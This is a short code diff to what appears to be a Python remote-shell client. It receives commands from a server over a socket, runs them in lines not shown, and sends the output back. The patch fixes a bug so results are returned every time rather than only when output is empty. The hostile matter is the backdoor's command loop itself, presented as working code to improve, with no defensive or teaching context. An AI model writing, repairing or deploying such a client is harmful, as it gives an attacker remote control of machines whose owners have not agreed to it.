@@ -14,6 +14,7 @@ print('[*] server:', msg)
 while True:
     cmd = s.recv(1024).decode()
     print(f'[+] recieved command: {cmd}')
+
     if cmd.lower() in ['q', 'quit', 'exit', 'x']:
         break
 
@@ -25,6 +26,7 @@ while True:
 
     if len(result) == 0:
         result = '[+] Executed Succesfully'.encode()
-        s.send(result)
+
+    s.send(result)
 
 s.close()
